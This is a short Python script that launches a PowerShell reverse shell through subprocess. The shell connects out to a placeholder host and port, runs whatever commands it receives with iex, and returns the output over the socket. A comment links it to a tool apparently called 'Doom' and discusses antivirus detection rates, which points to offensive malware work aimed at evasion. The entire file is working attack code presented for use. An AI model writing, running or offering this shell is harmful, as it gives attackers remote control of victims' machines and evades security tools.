from subprocess import run

#-A reverse shell is not implemented into Doom due to the high detection rate, i dont recomend using it if you want a low detection rate.

run("powershell.exe New-Object System.Net.Sockets.TCPClient('0.0.0.0',0);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \". { $data } 2>&1\" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",shell=True)
